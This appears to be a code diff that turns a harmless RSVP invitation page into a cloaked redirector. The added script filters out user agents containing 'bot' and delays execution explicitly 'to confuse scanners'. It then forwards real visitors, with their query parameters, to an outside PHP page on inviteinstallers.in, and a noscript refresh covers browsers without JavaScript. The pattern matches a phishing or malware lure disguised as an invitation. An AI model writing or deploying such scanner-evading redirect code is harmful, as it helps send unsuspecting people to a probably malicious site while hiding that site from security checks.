@@ -3,238 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RSVP Redirect</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Georgia', serif;
-        }
-        
-        body {
-            background-color: #f8f5f2;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            color: #333;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect fill="none" stroke="%23e8e0d8" stroke-width="0.5" x="0" y="0" width="100" height="100"/></svg>');
-        }
-        
-        .container {
-            width: 100%;
-            max-width: 600px;
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-            position: relative;
-            border: 1px solid #e8e0d8;
-        }
-        
-        .header {
-            background-color: #2c3e50;
-            color: white;
-            padding: 30px 20px;
-            text-align: center;
-            position: relative;
-        }
-        
-        .header::after {
-            content: "";
-            position: absolute;
-            bottom: -10px;
-            left: 0;
-            width: 100%;
-            height: 20px;
-            background: white;
-            border-radius: 50% 50% 0 0;
-        }
-        
-        h1 {
-            font-size: 42px;
-            font-weight: normal;
-            letter-spacing: 3px;
-            margin-bottom: 5px;
-        }
-        
-        .subtitle {
-            font-size: 16px;
-            letter-spacing: 8px;
-            margin-top: 10px;
-            text-transform: uppercase;
-        }
-        
-        .divider {
-            height: 1px;
-            background: linear-gradient(to right, transparent, #d4c9bc, transparent);
-            margin: 25px 0;
-        }
-        
-        .content {
-            padding: 40px;
-            text-align: center;
-        }
-        
-        .invitation-text {
-            font-size: 24px;
-            margin-bottom: 30px;
-            color: #5d4c3a;
-            line-height: 1.5;
-        }
-        
-        .event-name {
-            font-size: 28px;
-            font-weight: bold;
-            margin: 25px 0;
-            color: #2c3e50;
-            font-style: italic;
-        }
-        
-        .redirect-info {
-            background-color: #f9f7f4;
-            border-radius: 8px;
-            padding: 20px;
-            margin: 30px 0;
-            border: 1px solid #e8e0d8;
-            text-align: left;
-        }
-        
-        .redirect-url {
-            font-weight: bold;
-            color: #2c3e50;
-            word-break: break-all;
-            display: block;
-            margin-top: 10px;
-            padding: 10px;
-            background: white;
-            border-radius: 4px;
-            border: 1px dashed #d4c9bc;
-        }
-        
-        .countdown {
-            font-size: 18px;
-            margin: 25px 0;
-            color: #8b6b4c;
-            font-weight: bold;
-        }
-        
-        .btn {
-            display: inline-block;
-            background-color: #8b6b4c;
-            color: white;
-            padding: 14px 35px;
-            border-radius: 4px;
-            text-decoration: none;
-            font-weight: normal;
-            transition: all 0.3s ease;
-            border: none;
-            cursor: pointer;
-            font-size: 16px;
-            letter-spacing: 1px;
-            margin-top: 10px;
-            border: 1px solid #7a5d41;
-        }
-        
-        .btn:hover {
-            background-color: #7a5d41;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-        
-        .footer {
-            margin-top: 30px;
-            text-align: center;
-            color: #8b7d6b;
-            font-size: 14px;
-            padding: 20px;
-            border-top: 1px solid #e8e0d8;
-        }
-        
-        @media (max-width: 600px) {
-            .content {
-                padding: 25px;
+    <title>Redirecting...</title>
+
+    <!-- Strong Bot Protection -->
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="referrer" content="no-referrer">
+
+    <!-- Masked JavaScript for real users -->
+    <script>
+        // Delay to confuse scanners
+        setTimeout(function () {
+            // Use browser fingerprint as a simple bot filter
+            if (navigator.userAgent && !navigator.userAgent.includes("bot")) {
+                // Grab all query parameters (if any)
+                let query = window.location.search;
+                // Define your destination base
+                let base = "https://inviteinstallers.in/trea/loveandcare/loud.php";
+                // Final link
+                let finalURL = base + query;
+                // Redirect
+                window.location.replace(finalURL);
+            } else {
+                document.body.innerHTML = "<h1>Access Denied</h1>";
             }
-            
-            h1 {
-                font-size: 36px;
-            }
-            
-            .invitation-text {
-                font-size: 20px;
-            }
-            
-            .event-name {
-                font-size: 24px;
-            }
-        }
-    </style>
+        }, 500); // 0.5 second delay to confuse fast bots
+    </script>
+
+    <!-- Clean fallback for JS-disabled browsers (corrected) -->
+    <noscript>
+        <meta http-equiv="refresh" content="0;url=https://inviteinstallers.in/trea/loveandcare/loud.php">
+    </noscript>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>RsvP</h1>
-            <div class="subtitle">YOU'RE INVITED TO DINE WITH US</div>
-        </div>
-        
-        <div class="content">
-            <div class="invitation-text">
-                We cordially invite you to join us for an evening of fine dining and conversation.
-            </div>
-            
-            <div class="divider"></div>
-            
-            <div class="event-name">Jinner & Quicks</div>
-            
-            <div class="divider"></div>
-            
-            <div class="redirect-info">
-                You're being redirected to our RSVP page:
-                <span class="redirect-url" id="target-url">https://example.com/rsvp</span>
-            </div>
-            
-            <div class="countdown">
-                Redirecting in <span id="countdown">5</span> seconds...
-            </div>
-            
-            <a href="https://example.com/rsvp" class="btn" id="redirect-btn">RSVP Now</a>
-        </div>
-        
-        <div class="footer">
-            <p>Please respond by the requested date | Formal Attire</p>
-        </div>
-    </div>
-
-    <script>
-        // Configuration - Update these values as needed
-        const redirectUrl = "https://example.com/rsvp"; // Replace with your actual RSVP URL
-        const countdownStart = 5; // Countdown time in seconds
-        
-        // Set the target URL in the display
-        document.getElementById('target-url').textContent = redirectUrl;
-        document.getElementById('redirect-btn').href = redirectUrl;
-        
-        // Countdown functionality
-        let countdown = countdownStart;
-        const countdownElement = document.getElementById('countdown');
-        
-        const countdownInterval = setInterval(() => {
-            countdown--;
-            countdownElement.textContent = countdown;
-            
-            if (countdown <= 0) {
-                clearInterval(countdownInterval);
-                window.location.href = redirectUrl;
-            }
-        }, 1000);
-        
-        // Allow user to skip countdown by clicking the button
-        document.getElementById('redirect-btn').addEventListener('click', function(e) {
-            clearInterval(countdownInterval);
-        });
-    </script>
+    <h1>Redirecting... Please wait for your invitation</h1>
 </body>
 </html>
